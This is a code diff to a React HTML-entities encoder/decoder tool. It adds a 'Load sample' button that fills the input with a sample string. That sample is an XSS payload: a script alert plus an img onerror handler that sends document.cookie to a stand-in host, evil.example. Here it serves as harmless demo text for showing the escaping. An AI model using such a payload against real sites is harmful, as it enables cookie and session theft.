@@ -9,6 +9,9 @@ import { encodeHtmlEntities, decodeHtmlEntities } from "./logic";
 
 type Mode = "encode" | "decode";
 
+const SAMPLE =
+  "<script>alert('pwned')</script> & <img src=x onerror=\"fetch('//evil.example/'+document.cookie)\">";
+
 export default function HtmlEntitiesTool() {
   const [mode, setMode] = useState<Mode>("encode");
   const [input, setInput] = useState("");
@@ -66,10 +69,18 @@ export default function HtmlEntitiesTool() {
       <Field
         label={mode === "encode" ? "Text to encode" : "Entities to decode"}
         actions={
-          <Button size="sm" variant="ghost" onClick={swap} disabled={!output}>
-            <ArrowDownUp className="size-3.5" />
-            Use output as input
-          </Button>
+          <>
+            <button
+              onClick={() => setInput(SAMPLE)}
+              className="text-xs text-muted-foreground transition-colors hover:text-foreground"
+            >
+              Load sample
+            </button>
+            <Button size="sm" variant="ghost" onClick={swap} disabled={!output}>
+              <ArrowDownUp className="size-3.5" />
+              Use output as input
+            </Button>
+          </>
         }
       >
         <Textarea
